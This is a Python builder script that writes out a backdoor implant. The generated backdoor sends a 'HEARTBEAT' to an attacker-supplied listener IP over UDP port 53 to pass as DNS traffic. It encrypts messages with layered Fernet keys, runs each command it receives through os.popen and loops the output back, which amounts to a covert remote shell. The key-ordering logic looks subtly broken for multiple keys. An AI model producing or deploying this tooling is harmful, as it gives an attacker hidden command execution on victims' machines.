import shutil
import os
import sys
if len(sys.argv) < 2:
  print("Usage: <program> <listener ip>")
  sys.exit(1)
ip = sys.argv[1]
keys = []
if not os.path.isfile("keys"):
     print("Keys file not found. Please generate one with \"key_generator.py\"")
     sys.exit(1)
for key in open("keys").readlines():
   keys.append(bytes(key.strip(), 'utf-8'))
keys.reverse()
keys2 = keys
keys2.reverse()

keys = str(keys)


full = f"""
import os
import sys
import time
import socket
from cryptography.fernet import Fernet

keys = {keys}
keys2 = {keys2}
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
serv = ('{ip}', 53)

payload = bytes("HEARTBEAT", "utf-8")
s.connect(serv)
while True:
    for key in keys:
       key2 = key.decode()
       key = Fernet(key)
       payload  = key.encrypt(payload)
    s.sendto(payload, serv)
    data = s.recvfrom(999999)[0]
    for key in keys2:
       key2 = key.decode()
       key = Fernet(key)
       data = key.decrypt(data)
    print(data)
    data = data.decode()
    payload = os.popen(data).read()
    payload = bytes(payload, "utf-8")
"""
if not os.path.isdir("backdoor"):
 os.mkdir("backdoor")
os.system("cp -r cryptography backdoor")
open("backdoor/backdoor.py", "w").write(full)
print("BACKDOOR GENERATED SUCCESSFULLY")
